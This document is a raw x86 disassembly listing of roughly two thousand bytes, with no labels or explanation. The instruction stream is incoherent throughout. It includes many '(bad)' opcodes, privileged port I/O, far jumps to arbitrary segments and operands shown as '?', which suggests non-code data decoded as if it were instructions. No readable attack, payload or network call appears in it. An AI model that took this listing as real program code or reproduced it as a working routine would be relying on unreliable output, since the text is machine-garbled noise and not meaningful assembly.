  411f7a:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  411f7b:	mov    dl,BYTE PTR [esi]
  411f7d:	std    
  411f7e:	or     eax,0xfb37baf5
  411f83:	imul   ebx,DWORD PTR [ebx-0x7344c119],0xd3fbe27d
  411f8d:	pop    ecx
  411f8e:	outs   dx,BYTE PTR ds:[esi]
  411f8f:	jecxz  0x411f3c
  411f91:	add    DWORD PTR [ebp-0x20],edx
  411f94:	push   edi
  411f95:	clc    
  411f96:	dec    ebx
  411f97:	add    dl,bh
  411f99:	retf   0x6c57
  411f9c:	sbb    DWORD PTR [edx],edx
  411f9e:	dec    edx
  411f9f:	pushf  
  411fa0:	leave  
  411fa1:	inc    ecx
  411fa2:	gs or  BYTE PTR fs:[edi-0x5af5b416],bh
  411faa:	dec    ebp
  411fab:	out    dx,eax
  411fac:	dec    edx
  411fad:	and    dh,BYTE PTR [edi]
  411faf:	cmp    eax,0xae8ad476
  411fb4:	fisubr WORD PTR [eax-0x6d2262e9]
  411fba:	sub    eax,0x8e53dc0e
  411fbf:	ffreep st(5)
  411fc1:	test   ebx,0xfd41aa13
  411fc7:	adc    al,0x8
  411fc9:	(bad)  
  411fca:	call   0xf99345d
  411fcf:	mov    esi,0x8baa55
  411fd4:	jno    0x412039
  411fd6:	jmp    0x61cef5e2
  411fdb:	enter  0x4e5e,0x18
  411fdf:	call   DWORD PTR [edx-0x25a94b5]
  411fe5:	inc    esi
  411fe6:	test   eax,0xfcc5a727
  411feb:	adc    ebx,esp
  411fed:	or     BYTE PTR [edx-0x57],0x5f
  411ff1:	xlat   BYTE PTR ds:[ebx]
  411ff2:	leave  
  411ff3:	mov    ds,WORD PTR [edx]
  411ff5:	adc    ch,BYTE PTR [ebx]
  411ff7:	scas   eax,DWORD PTR es:[edi]
  411ff8:	add    eax,0xc5ec667f
  411ffd:	xlat   BYTE PTR ds:[ebx]
  411ffe:	or     bl,BYTE PTR [ebp+0x76e108a4]
  412004:	fld    QWORD PTR [edi-0x4697142a]
  41200a:	adc    al,0xc9
  41200c:	inc    ecx
  41200d:	push   edx
  41200e:	es dec esi
  412010:	jmp    0x389ecd74
  412015:	mov    al,0x1c
  412017:	popa   
  412018:	(bad)  
  412019:	and    eax,0x52b7679a
  41201e:	mov    ecx,ebx
  412020:	push   edx
  412021:	fidiv  WORD PTR [ecx+ebx*4-0x241ad324]
  412028:	(bad)  
  412029:	xor    ah,al
  41202b:	outs   dx,BYTE PTR ds:[esi]
  41202c:	mov    ds:0x24cf3113,al
  412031:	or     eax,0xa03c5722
  412036:	push   es
  412037:	std    
  412038:	int3   
  412039:	fs pop edi
  41203b:	mov    esp,eax
  41203d:	(bad)
  412041:	mov    al,ds:0x202a521f
  412046:	add    BYTE PTR [edx+0x15],0x9
  41204a:	ret    
  41204b:	xor    bl,BYTE PTR [edx+0x30b29fd0]
  412051:	jo     0x412024
  412053:	jle    0x412039
  412055:	popa   
  412056:	(bad)  
  412057:	xor    dl,BYTE PTR [ecx+0x40]
  41205a:	adc    esp,0xc4e75a47
  412060:	mov    al,ds:0x673e6e39
  412065:	mov    bl,0x81
  412067:	xor    al,al
  412069:	add    al,0xcd
  41206b:	lea    eax,[esp+eiz*2+0x2a]
  41206f:	adc    BYTE PTR [ebx],0x81
  412072:	jo     0x41204b
  412074:	pop    ebp
  412075:	stos   BYTE PTR es:[edi],al
  412076:	pop    es
  412077:	push   cs
  412078:	clc    
  412079:	and    BYTE PTR [di],dh
  41207c:	dec    esi
  41207d:	sti    
  41207e:	repnz test BYTE PTR [ebp-0x79],cl
  412082:	aas    
  412083:	mov    bl,0xe
  412085:	fwait
  412086:	(bad)  
  412087:	cmp    esp,DWORD PTR [edx+0x6cd8cfd9]
  41208d:	hlt    
  41208e:	xor    bl,BYTE PTR [edx]
  412090:	into   
  412091:	sbb    ebp,ebx
  412093:	outs   dx,BYTE PTR ds:[esi]
  412094:	push   es
  412095:	inc    si
  412097:	push   0x9a637bca
  41209c:	dec    esi
  41209d:	int    0xd
  41209f:	call   DWORD PTR [eax]
  4120a1:	ficom  WORD PTR [esi-0x13e46b92]
  4120a7:	pop    edi
  4120a8:	call   0xe3e3:0x14f839c0
  4120af:	sub    esp,DWORD PTR [eax+0x23]
  4120b2:	cs inc ecx
  4120b4:	es enter 0x34c2,0x18
  4120b9:	pop    esi
  4120ba:	mov    dl,al
  4120bc:	and    ebp,DWORD PTR [esi]
  4120be:	fild   DWORD PTR [eax+eiz*2-0x91c3b37]
  4120c5:	pop    es
  4120c6:	xchg   BYTE PTR [eax],dl
  4120c8:	push   es
  4120c9:	jmp    0x4c07:0x168a6cc8
  4120d0:	ror    DWORD PTR [edi-0x4dfe9d4c],cl
  4120d6:	jmp    0x475a:0x648f1ee1
  4120dd:	and    ah,BYTE PTR [edx-0x42]
  4120e0:	ret    0x342a
  4120e3:	in     al,dx
  4120e4:	fstp   DWORD PTR [ecx+ebx*4-0xa]
  4120e8:	inc    ebx
  4120e9:	push   ds
  4120ea:	out    0xd0,eax
  4120ec:	add    al,0x2d
  4120ee:	stos   BYTE PTR es:[edi],al
  4120ef:	js     0x41210f
  4120f1:	dec    esp
  4120f2:	ret    0xf5da
  4120f5:	inc    edi
  4120f6:	add    eax,0x257a0316
  4120fb:	sbb    cl,0xa3
  4120fe:	sbb    ebx,esi
  412100:	or     BYTE PTR [ecx],al
  412102:	jb     0x4120cd
  412104:	ins    DWORD PTR es:[edi],dx
  412105:	push   ecx
  412106:	and    DWORD PTR [ebx-0x73],eax
  412109:	outs   dx,DWORD PTR ds:[esi]
  41210a:	jbe    0x4120f0
  41210c:	repnz mov ebx,0x21baab5
  412112:	and    BYTE PTR [ebx+edx*1-0x3d],cl
  412116:	shl    DWORD PTR [ecx+eiz*8],cl
  412119:	std    
  41211a:	xlat   BYTE PTR ds:[ebx]
  41211b:	outs   dx,DWORD PTR ds:[esi]
  41211c:	mov    DWORD PTR [ebx+0x5de7c107],ebx
  412122:	imul   ebp,DWORD PTR [ebp-0x3f],0xbf3ef1b1
  412129:	pop    edi
  41212a:	sbb    dl,bl
  41212c:	in     eax,dx
  41212d:	add    esi,DWORD PTR [ecx-0x63]
  412130:	jne    0x4121aa
  412132:	ss daa 
  412134:	xchg   ecx,eax
  412135:	popa   
  412136:	mov    edi,0xd5b22a46
  41213b:	push   edx
  41213c:	ror    BYTE PTR [edx+0x3a8c404e],0xd4
  412143:	and    ebp,DWORD PTR [eax]
  412145:	arpl   WORD PTR [ecx-0x5bc6f448],di
  41214b:	les    esi,FWORD PTR [ebx-0x1a]
  41214e:	adc    eax,0xa9ddf711
  412153:	jno    0x41210b
  412155:	loope  0x41213a
  412157:	push   ebx
  412158:	jmp    0x412179
  41215a:	dec    esp
  41215b:	dec    esi
  41215c:	fwait
  41215d:	gs and bh,ah
  412160:	cwde   
  412161:	aad    0xae
  412163:	pop    ecx
  412164:	cmc    
  412165:	cli    
  412166:	inc    eax
  412167:	mov    al,0xf9
  412169:	out    dx,al
  41216a:	mov    ds:0xd560dae7,eax
  41216f:	scas   eax,DWORD PTR es:[edi]
  412170:	dec    esi
  412171:	push   esi
  412172:	push   edi
  412173:	push   edi
  412174:	sbb    al,0x71
  412176:	inc    ecx
  412177:	mov    bl,0xa0
  412179:	icebp  
  41217a:	ficomp DWORD PTR [ebx-0x70]
  41217d:	outs   dx,DWORD PTR ds:[esi]
  41217e:	les    ecx,FWORD PTR [eax+0x29c96b38]
  412184:	sti    
  412185:	xchg   edi,eax
  412186:	inc    ebp
  412187:	call   DWORD PTR [ecx-0x4662c9f0]
  41218d:	out    dx,al
  41218e:	in     eax,0xf3
  412190:	repnz push 0xffffffcb
  412193:	xchg   ebx,eax
  412194:	stc    
  412195:	scas   eax,DWORD PTR es:[edi]
  412196:	cmp    al,BYTE PTR [eax-0x5f]
  412199:	in     al,0x5c
  41219b:	loopne 0x4121ad
  41219d:	mov    bl,0x90
  41219f:	jo     0x412151
  4121a1:	dec    esi
  4121a2:	push   ebp
  4121a3:	adc    dh,BYTE PTR [ebx-0x6a]
  4121a6:	pop    ebx
  4121a7:	mov    WORD PTR [esi-0x28a1f3c5],?
  4121ad:	cmp    bl,BYTE PTR [ebx+0x5eb54e96]
  4121b3:	push   ecx
  4121b4:	sbb    ecx,DWORD PTR [ecx+0xfe454c5]
  4121ba:	popf   
  4121bb:	pop    esi
  4121bc:	mov    esp,0xfe53d7b8
  4121c1:	int3   
  4121c2:	call   0x9142:0xfdc8dd12
  4121c9:	lds    edi,FWORD PTR [edx-0x3c]
  4121cc:	adc    eax,0x5766535
  4121d1:	out    dx,al
  4121d2:	pop    edx
  4121d3:	mov    ah,BYTE PTR [eax-0x1b]
  4121d6:	ss inc eax
  4121d8:	hlt    
  4121d9:	stc    
  4121da:	pop    ds
  4121db:	jmp    0x4121e4
  4121dd:	add    al,0x4
  4121df:	std    
  4121e0:	or     ah,BYTE PTR [ebp+0x3069aaa7]
  4121e6:	or     DWORD PTR [edi+0x45d57f56],eax
  4121ec:	adc    esi,DWORD PTR es:0x5fe46b8d
  4121f3:	(bad)
  4121f7:	and    edi,DWORD PTR [ebp+0x19]
  4121fa:	cli    
  4121fb:	push   ecx
  4121fc:	push   edx
  4121fd:	sub    bl,BYTE PTR [edi]
  4121ff:	mov    DWORD PTR [edx+edx*8-0xd],ebx
  412203:	in     eax,dx
  412204:	ret    0x2860
  412207:	ja     0x412273
  412209:	ja     0x412213
  41220b:	adc    al,0xfa
  41220d:	and    eax,edi
  41220f:	fnsave [esi+0x45252cfd]
  412215:	inc    eax
  412216:	je     0x4121ba
  412218:	jmp    0xa2a2d22
  41221d:	gs mov bh,0xc1
  412220:	sahf   
  412221:	mov    WORD PTR [esi],?
  412223:	xor    dl,BYTE PTR [edx]
  412225:	inc    esi
  412226:	lods   eax,DWORD PTR ds:[esi]
  412227:	ror    DWORD PTR [ecx+0x34],cl
  41222a:	adc    al,0xad
  41222c:	cmc    
  41222d:	shl    DWORD PTR [esi-0x3e],1
  412230:	ss mov bh,0x6f
  412233:	leave  
  412234:	lahf   
  412235:	scas   eax,DWORD PTR es:[edi]
  412236:	add    BYTE PTR [esi+0xc],0x7c
  41223a:	repnz lock cmp al,BYTE PTR [ebp-0x7b8b273b]
  412242:	mov    ds:0x5711ae2b,al
  412247:	ret    0xa3d7
  41224a:	sbb    al,0xd
  41224c:	out    dx,al
  41224d:	add    esp,DWORD PTR [ebx+0x13bb9d03]
  412253:	or     al,0x9f
  412255:	push   0xf7d42cb5
  41225a:	xor    al,0xe7
  41225c:	fadd   DWORD PTR [esi+0x3e]
  41225f:	scas   eax,DWORD PTR es:[edi]
  412260:	adc    bl,dh
  412262:	add    DWORD PTR [ebp+0x7917895b],0xfffffff6
  412269:	dec    esi
  41226a:	mov    ah,al
  41226c:	push   ecx
  41226d:	test   BYTE PTR ds:0xe71bd755,bl
  412273:	push   ebp
  412274:	sbb    al,0xf2
  412276:	(bad)  
  412277:	fistp  DWORD PTR [ebx]
  412279:	mov    bh,0xca
  41227b:	xor    ebp,esp
  41227d:	push   ebp
  41227e:	sbb    esp,edi
  412280:	adc    eax,0xbcf3a197
  412285:	and    eax,0x6ae4f0dd
  41228a:	dec    ecx
  41228b:	pop    es
  41228c:	inc    esi
  41228d:	cmp    al,0xac
  41228f:	ins    DWORD PTR es:[edi],dx
  412290:	sub    ch,dh
  412292:	out    0xe2,al
  412294:	push   esp
  412295:	sub    eax,0xabc196bd
  41229a:	jae    0x412270
  41229c:	sub    al,0xf
  41229e:	aad    0x2c
  4122a0:	add    ch,0xb2
  4122a3:	xchg   ebx,eax
  4122a4:	sbb    edi,edx
  4122a6:	leave  
  4122a7:	je     0x412253
  4122a9:	fild   WORD PTR [ebp+edx*2-0x70a85e9]
  4122b1:	test   eax,0xd58270bc
  4122b6:	mov    dh,0xe7
  4122b8:	mov    esp,0xefa59696
  4122bd:	or     ch,BYTE PTR [edi]
  4122bf:	xor    eax,DWORD PTR [edx-0x187c4544]
  4122c5:	dec    edx
  4122c6:	pop    edx
  4122c7:	xchg   edx,eax
  4122c8:	(bad)  
  4122c9:	retf   0xe09d
  4122cc:	cdq    
  4122cd:	in     al,0xac
  4122cf:	sar    DWORD PTR [esi+esi*8-0x57],0xa9
  4122d4:	mov    cl,BYTE PTR [edx-0x68f39acb]
  4122da:	cmp    al,0xc8
  4122dc:	push   cs
  4122dd:	jl     0x412321
  4122df:	out    dx,eax
  4122e0:	call   0x2232:0x3d0c0626
  4122e7:	fsubp  st(1),st
  4122e9:	scas   eax,DWORD PTR es:[edi]
  4122ea:	or     esp,DWORD PTR ds:0x306dfa11
  4122f0:	dec    ebx
  4122f1:	xchg   ebp,eax
  4122f2:	imul   ecx,DWORD PTR [ebx-0x4c],0xffffff84
  4122f6:	cmp    al,0xa9
  4122f8:	jle    0x4122d6
  4122fa:	dec    eax
  4122fb:	out    dx,al
  4122fc:	stos   BYTE PTR es:[edi],al
  4122fd:	sub    DWORD PTR [eax-0x58a19de5],edx
  412303:	test   al,0xb1
  412305:	jns    0x41229c
  412307:	cmp    DWORD PTR [eax+0x6e],eax
  41230a:	lock jge 0x41234f
  41230d:	cmp    eax,0xbcb6b260
  412312:	push   cs
  412313:	adc    BYTE PTR [edi-0x31],ch
  412316:	xor    eax,0x623eb101
  41231b:	mov    cl,0x8e
  41231d:	scas   eax,DWORD PTR es:[edi]
  41231e:	in     al,0x62
  412320:	cmp    esi,DWORD PTR [eax-0x269f3559]
  412326:	mov    ch,0x7e
  412328:	test   BYTE PTR [edx+0x3dcaac4d],ch
  41232e:	xchg   edi,eax
  41232f:	mov    ebx,0xccde638d
  412334:	(bad)  
  412335:	sahf   
  412336:	in     eax,0x40
  412338:	mov    ah,0x13
  41233a:	sub    dh,BYTE PTR [ecx+0x7e]
  41233d:	adc    eax,0x5d383452
  412342:	sbb    al,0xd4
  412344:	es pop ecx
  412346:	xor    dl,ch
  412348:	aam    0x8d
  41234a:	cmp    BYTE PTR [esi],ah
  41234c:	jae    0x41234b
  41234e:	imul   ecx,esp,0x3e
  412351:	test   al,0xa0
  412354:	rol    BYTE PTR [esi],cl
  412356:	cdq    
  412357:	fiadd  DWORD PTR [ebx-0x6869646c]
  41235d:	(bad)  
  41235e:	nop
  41235f:	(bad)  
  412360:	clc    
  412361:	fist   WORD PTR [esp+eax*8]
  412364:	xor    cl,BYTE PTR [ecx+0x6e]
  412367:	mov    esp,0x3deb413b
  41236c:	cmp    eax,0x38273268
  412371:	pop    eax
  412372:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  412373:	lahf   
  412374:	retf   0x4e5d
  412377:	or     al,0x8d
  412379:	inc    esi
  41237a:	fs out 0x70,al
  41237d:	repz (bad) 
  41237f:	xchg   ebp,eax
  412380:	test   DWORD PTR [edx+ebp*1+0x1754f4c2],0x44a6bab7
  41238b:	in     eax,0xc2
  41238d:	into   
  41238e:	mov    ebp,0x38f98131
  412394:	aas    
  412395:	dec    edx
  412396:	jbe    0x41232a
  412398:	mov    WORD PTR [ebx],es
  41239a:	push   ss
  41239b:	mov    ebp,0x215a74d7
  4123a0:	pop    esi
  4123a1:	imul   edi,DWORD PTR [eax],0x64
  4123a4:	and    DWORD PTR [edx],edi
  4123a6:	add    eax,0xc045235
  4123ab:	or     bl,bh
  4123ad:	repnz mov bl,0x12
  4123b0:	nop
  4123b1:	aad    0x64
  4123b3:	pop    esi
  4123b4:	aaa    
  4123b5:	int3   
  4123b6:	ja     0x412347
  4123b8:	push   ecx
  4123b9:	mov    edx,0x65416b6f
  4123be:	popf   
  4123bf:	sub    al,0xb1
  4123c1:	fiadd  DWORD PTR [edi+0x5eb6bc14]
  4123c7:	jne    0x41236c
  4123c9:	xchg   edx,eax
  4123ca:	pop    es
  4123cb:	pop    ebp
  4123cc:	push   edx
  4123cd:	sub    eax,0xc2d19a68
  4123d2:	fsub   QWORD PTR [esi+0x7c]
  4123d5:	fxtract 
  4123d7:	cld    
  4123d8:	xor    eax,0x56b495ca
  4123dd:	and    DWORD PTR [edi+eiz*2],edi
  4123e0:	inc    ecx
  4123e1:	stos   BYTE PTR es:[edi],al
  4123e2:	(bad)  
  4123e3:	push   edx
  4123e4:	add    DWORD PTR [edx+0x3a],ebx
  4123e7:	and    BYTE PTR [eax],ah
  4123e9:	cmp    ch,0x0
  4123ec:	push   cs
  4123ed:	mov    al,ds:0x8afa135b
  4123f2:	repz push ss
  4123f4:	scas   al,BYTE PTR es:[edi]
  4123f5:	pop    ebp
  4123f6:	and    BYTE PTR [edi],cl
  4123f8:	leave  
  4123f9:	test   DWORD PTR [esi+0x390ddb8b],0xe6db3fb8
  412403:	mov    cl,BYTE PTR [ebp+0x5f0cbe05]
  412409:	imul   ebp,ebp,0xe6161526
  41240f:	pop    ss
  412410:	adc    eax,0xd7c0fe2
  412415:	jp     0x4123ab
  412417:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  412418:	icebp  
  412419:	push   ecx
  41241a:	nop
  41241b:	dec    esp
  41241c:	add    ebx,DWORD PTR [ebp-0x3a]
  41241f:	xchg   ebx,eax
  412420:	lock int 0xfb
  412423:	test   eax,0xe8bf957b
  412428:	mov    bl,BYTE PTR [ebx-0x43]
  41242b:	mov    esi,0x463b7ed3
  412430:	jmp    0xc4b3ebf1
  412435:	shl    BYTE PTR [eax],0x63
  412438:	repz loope 0x412438
  41243b:	pusha  
  41243c:	mov    bh,0xa4
  41243e:	je     0x412472
  412440:	dec    edi
  412441:	das    
  412442:	ds call 0x38a16a2e
  412448:	and    al,0x6a
  41244a:	inc    eax
  41244b:	fdivr  DWORD PTR [ebx-0x2d]
  41244e:	mov    ah,0x88
  412450:	add    ah,al
  412452:	rcl    BYTE PTR [edx-0xa0efe23],1
  412458:	test   BYTE PTR [ebx+0x5],0xa8
  41245c:	cld    
  41245d:	push   ebx
  41245e:	into   
  41245f:	int3   
  412460:	cmp    edi,DWORD PTR [eax-0x4945db16]
  412466:	sbb    al,0x31
  412468:	xor    eax,DWORD PTR [esi*4-0x251a34d9]
  41246f:	stos   DWORD PTR es:[edi],eax
  412470:	jge    0x412484
  412472:	sub    edi,edi
  412474:	mov    al,0x59
  412476:	scas   al,BYTE PTR es:[edi]
  412477:	fs nop
  412479:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41247a:	jp     0x4124ad
  41247c:	inc    esi
  41247d:	xchg   edi,eax
  41247e:	sbb    cl,BYTE PTR [esi]
  412480:	mov    fs,WORD PTR [ecx-0x5c]
  412483:	mov    dl,0x27
  412485:	(bad)  
  412486:	xor    eax,0xfcbd47a3
  41248b:	test   BYTE PTR [ecx+edx*2+0x1be74bcc],al
  412492:	in     al,dx
  412493:	sub    al,0x61
  412495:	aaa    
  412496:	popf   
  412497:	push   eax
  412498:	and    ecx,DWORD PTR [si]
  41249b:	mov    al,ds:0xd685c6f7
  4124a0:	std    
  4124a1:	mov    esi,0xc1975fd7
  4124a6:	push   eax
  4124a7:	cdq    
  4124a8:	xor    BYTE PTR [ebx+0x2148dc7f],ch
  4124ae:	xor    eax,0x6bd245e5
  4124b3:	and    al,0x1d
  4124b5:	jge    0x4124cb
  4124b7:	inc    edx
  4124b8:	and    ebp,DWORD PTR [edi+0x4a]
  4124bb:	les    edx,FWORD PTR [ebx]
  4124bd:	push   ecx
  4124be:	jnp    0x4124d3
  4124c0:	in     al,0xa7
  4124c2:	adc    BYTE PTR [edi],0x9a
  4124c5:	push   eax
  4124c6:	mov    edx,0x9db2814
  4124cb:	xor    BYTE PTR [ecx+0x2cdb53e9],bh
  4124d1:	arpl   WORD PTR [ebx],dx
  4124d3:	or     eax,0x86a94695
  4124d8:	pushf  
  4124d9:	push   edx
  4124da:	mov    ebp,DWORD PTR ds:0xa68cdd5a
  4124e0:	mov    bh,0xab
  4124e2:	shl    BYTE PTR [ecx+0x2b339cf1],0xe8
  4124e9:	icebp  
  4124ea:	mov    ah,BYTE PTR [esi+0x297fa680]
  4124f0:	dec    ebx
  4124f1:	and    BYTE PTR [ecx+0x1a],dh
  4124f4:	push   esp
  4124f5:	inc    edx
  4124f6:	stos   DWORD PTR es:[edi],eax
  4124f7:	rol    BYTE PTR es:[ebx],1
  4124fa:	xchg   BYTE PTR [ecx+0x78],cl
  4124fd:	aam    0x8
  4124ff:	cmp    BYTE PTR [eax-0x38d7a632],0xf8
  412506:	lahf   
  412507:	mov    ah,0xb1
  412509:	xchg   ecx,eax
  41250a:	(bad)  
  41250b:	sahf   
  41250c:	jmp    0x5b324f7a
  412511:	in     eax,0xab
  412513:	mov    bh,0x40
  412515:	mov    eax,0x18d61b32
  41251a:	cmc    
  41251b:	adc    BYTE PTR [edi-0x7f0c1e24],0xad
  412522:	hlt    
  412523:	add    DWORD PTR [ebx+0x19],edx
  412526:	outs   dx,DWORD PTR ds:[esi]
  412527:	aaa    
  412528:	shr    BYTE PTR [esi-0x51dec815],cl
  41252e:	mov    cl,0xa4
  412530:	mov    ch,0x77
  412532:	jmp    0x8ba3:0x829e49f6
  412539:	es mov al,0xef
  41253c:	and    ebx,ebx
  41253e:	lds    edi,FWORD PTR [ebx]
  412540:	add    DWORD PTR [eax+0x6c44cc9],esp
  412546:	pop    eax
  412547:	push   ss
  412548:	lock ins BYTE PTR es:[edi],dx
  41254a:	inc    esp
  41254b:	lds    esi,FWORD PTR [edx+0x66a1a0a6]
  412551:	test   BYTE PTR [esi-0x33],dl
  412554:	(bad)  
  412555:	ficom  WORD PTR [edx]
  412557:	pop    edi
  412558:	jl     0x412521
  41255a:	xor    cl,0xd5
  41255d:	xchg   esp,eax
  41255e:	push   0xfdb1b92c
  412563:	add    bl,BYTE PTR [eax+0x43]
  412566:	ja     0x412563
  412568:	in     al,0xeb
  41256a:	xor    al,BYTE PTR [eax]
  41256c:	push   es
  41256d:	add    DWORD PTR [esi-0x3b071473],esi
  412573:	inc    edx
  412574:	sbb    al,BYTE PTR [edx-0x7a]
  412577:	or     al,bh
  412579:	cmp    eax,0x6bd44459
  41257e:	push   ds
  41257f:	pop    ecx
  412580:	into   
  412581:	sbb    dl,BYTE PTR [ecx+0x4bbdb827]
  412587:	(bad)  
  412588:	xor    al,0xa
  41258a:	neg    BYTE PTR [edi]
  41258c:	mov    esp,0x66cd0927
  412591:	mov    al,ds:0xffbd11c0
  412596:	fsubp  st(1),st
  412598:	ja     0x4125ae
  41259a:	xor    ebx,0xd35752
  4125a0:	jmp    0x41255f
  4125a2:	pop    ds
  4125a3:	dec    ebp
  4125a4:	pop    ss
  4125a5:	in     al,dx
  4125a6:	dec    eax
  4125a7:	aas    
  4125a8:	push   0xf
  4125aa:	pop    eax
  4125ab:	mov    esp,0x8e9f7d0c
  4125b0:	mov    al,BYTE PTR [eax-0x76f27e55]
  4125b6:	cdq    
  4125b7:	push   eax
  4125b8:	imul   esp,DWORD PTR [esp+esi*2+0x36],0x59
  4125bd:	xchg   ecx,eax
  4125be:	pop    esi
  4125bf:	call   0xe631:0x86110c8
  4125c6:	push   ds
  4125c7:	or     eax,0x787d275c
  4125cc:	ins    DWORD PTR es:[edi],dx
  4125cd:	aas    
  4125ce:	outs   dx,BYTE PTR ds:[esi]
  4125cf:	dec    ebx
  4125d0:	mov    dh,0x3
  4125d2:	jecxz  0x41260f
  4125d4:	in     eax,0xde
  4125d6:	fldenv [edi-0x40]
  4125d9:	bswap  eax
  4125db:	pop    esi
  4125dc:	clc    
  4125dd:	sbb    eax,0xa92c88d7
  4125e2:	hlt    
  4125e3:	std    
  4125e4:	jbe    0x4125f7
  4125e6:	mov    eax,ds:0xab15ca59
  4125eb:	add    DWORD PTR [edi+0x1c],0xffffffd9
  4125ef:	jnp    0x41266f
  4125f1:	ret    
  4125f2:	mov    edi,0x9502f3
  4125f7:	xchg   ebp,eax
  4125f8:	sub    esi,DWORD PTR [edi]
  4125fa:	push   0x38eabe3a
  4125ff:	dec    ebp
  412600:	fwait
  412601:	or     al,0x8f
  412603:	(bad)
  412608:	cli    
  412609:	fsub   DWORD PTR [edi+0x1a2cd5b6]
  41260f:	jno    0x412647
  412611:	sbb    eax,0x98b21570
  412616:	and    BYTE PTR [ecx-0x55],dl
  412619:	xchg   esp,eax
  41261a:	sub    cl,0x52
  41261d:	test   DWORD PTR [ebp+0x29],0xa20e713d
  412624:	in     al,dx
  412625:	imul   edx,DWORD PTR ds:0x653b855d,0x6a1fbf0e
  41262f:	repz loopne 0x412629
  412632:	mov    esi,0x86e2f9de
  412637:	dec    edx
  412638:	jae    0x4125be
  41263a:	icebp  
  41263b:	mov    cl,0x9d
  41263d:	js     0x4126b2
  41263f:	dec    edi
  412640:	jecxz  0x4125e5
  412642:	cmp    bl,BYTE PTR [edx+0x29]
  412645:	int3   
  412646:	xor    eax,0x3fadb3c3
  41264b:	xor    BYTE PTR [ebx],ah
  41264d:	stos   BYTE PTR es:[edi],al
  41264e:	and    al,0x81
  412650:	imul   ecx,esi,0xffffffb5
  412653:	push   esi
  412654:	push   es
  412655:	inc    eax
  412656:	or     edi,DWORD PTR [esi+0x35]
  412659:	dec    edx
  41265a:	adc    dh,BYTE PTR [eax]
  41265c:	and    BYTE PTR [eax*2+0x656d2ef6],0x72
  412664:	jle    0x41266f
  412666:	dec    esp
  412667:	dec    eax
  412668:	fcmovb st,st(3)
  41266a:	sub    eax,0x1c3ebb5e
  41266f:	sbb    DWORD PTR [ebx+0x2],esi
  412672:	popa   
  412673:	mov    ah,0xe7
  412675:	sbb    BYTE PTR [eax-0x1f],ch
  412678:	in     al,dx
  412679:	pusha  
  41267a:	mov    esi,0x53f8aeb7
  41267f:	or     al,0xed
  412681:	push   edi
  412682:	xor    al,0xad
  412684:	adc    al,0x76
  412686:	inc    eax
  412687:	cmp    edi,DWORD PTR [esi+0x5ef09c64]
  41268d:	mov    eax,ds:0xac104b1e
  412692:	xchg   edx,eax
  412693:	cmp    al,0xf0
  412695:	mov    dl,0xfe
  412697:	jecxz  0x4126f2
  412699:	xor    al,0xed
  41269b:	mov    esp,0x9d303442
  4126a0:	retf   0x7762
  4126a3:	cld    
  4126a4:	push   eax
  4126a5:	ror    BYTE PTR [edi],cl
  4126a7:	repz mov ch,0x58
  4126aa:	jmp    0xf5da:0x139a3afc
  4126b1:	pop    esp
  4126b2:	lds    ecx,FWORD PTR [ebx-0x1897fb2a]
  4126b8:	rol    BYTE PTR [ebx],0xb5
  4126bb:	(bad)  
  4126bc:	cmp    al,0x71
  4126be:	and    esp,DWORD PTR [ecx+0x3702ca8f]
  4126c4:	call   0xb2887a20
  4126c9:	scas   eax,DWORD PTR es:[edi]
  4126ca:	sbb    dl,bl
  4126cc:	pop    esp
  4126cd:	ins    DWORD PTR es:[edi],dx
  4126ce:	pop    ecx
  4126cf:	jecxz  0x4126d7
  4126d1:	push   0xfaf4fddf
  4126d6:	xchg   ecx,ebx
  4126d8:	sbb    ah,BYTE PTR [esi-0x1a]
  4126db:	sub    eax,0xa02f7597
  4126e0:	pusha  
  4126e1:	fsub   DWORD PTR [edx]
  4126e3:	arpl   WORD PTR cs:[edi],bp
  4126e6:	dec    ebp
  4126e7:	pop    esp
  4126e8:	pop    ss
  4126e9:	xor    BYTE PTR [esi+0x38430199],dh
  4126ef:	xchg   edi,eax
  4126f0:	aam    0xf0
  4126f2:	mov    dh,0x1
  4126f4:	popf   
  4126f5:	fsub   QWORD PTR [edi-0x437e8154]
  4126fb:	pop    ebp
  4126fc:	mov    edx,db5
  4126ff:	jmp    0x12ada994
  412704:	rcl    BYTE PTR [edi],1
  412706:	push   eax
  412707:	into   
  412708:	push   0x5e2f4fc1
  41270d:	cmp    eax,0x4a8bed9c
  412712:	xchg   ecx,eax
  412713:	sub    al,0xfe
  412715:	jecxz  0x41278e
  412717:	sub    cl,BYTE PTR [eax-0x341ba996]
  41271d:	sbb    al,0xe7
  41271f:	js     0x4126df
  412721:	xchg   esp,eax
  412722:	das    
  412723:	inc    ecx
  412724:	jb     0x4126db
  412726:	jmp    0x6b4128d2
  41272b:	sub    edi,DWORD PTR [edi+0xf1075cd]
  412731:	daa    
  412732:	add    eax,0xfd1706d0
  412737:	lock sar DWORD PTR [eax+0x26],cl
  41273b:	arpl   WORD PTR [ecx*4+0x3f21e8b],ax
  412742:	daa    
  412743:	mov    eax,?
  412745:	push   ss
  412746:	loope  0x4126fd
  412748:	xchg   ebx,eax
  412749:	pop    esi
  41274a:	xor    ah,BYTE PTR ds:0xa769829e
  412750:	fiadd  DWORD PTR ds:0x7fd4ecf7
  412756:	fwait
  412757:	out    dx,eax
  412758:	inc    esp
  412759:	mov    ebx,0xa7ee54a5
  41275e:	mov    ds:0x65e99955,al
  412763:	pop    es
  412764:	xchg   ebx,eax
  412765:	stc    
  412766:	inc    eax
  412768:	xlat   BYTE PTR ds:[ebx]
  412769:	cld    
  41276a:	and    al,0xbc
  41276c:	sub    BYTE PTR [esi+eax*2+0x1b],bh
  412770:	(bad)  
  412771:	fmul   QWORD PTR [esi+0x7f9edaae]
  412777:	shl    DWORD PTR [eax],cl
  412779:	xchg   ecx,eax
  41277a:	jns    0x4127c4
  41277c:	aas    
  41277d:	jmp    DWORD PTR [edi]
  41277f:	fcmovne st,st(0)
  412781:	sbb    BYTE PTR [edx+esi*1+0x12],bl
  412785:	push   es
  412786:	rcr    DWORD PTR [ebp+0x195184c5],cl
  41278c:	or     al,0xd0
  41278e:	out    0x70,eax
  412790:	or     cl,ah
  412792:	adc    DWORD PTR [edx-0xa54ed16],ecx
  412798:	and    cl,BYTE PTR cs:[edx+0x77]
  41279c:	and    ecx,DWORD PTR [esi+ebx*8-0x57d4e582]
  4127a3:	pop    esp
  4127a4:	cmp    bh,dh
  4127a6:	je     0x41275f
  4127a8:	mov    edx,0xd83913c0
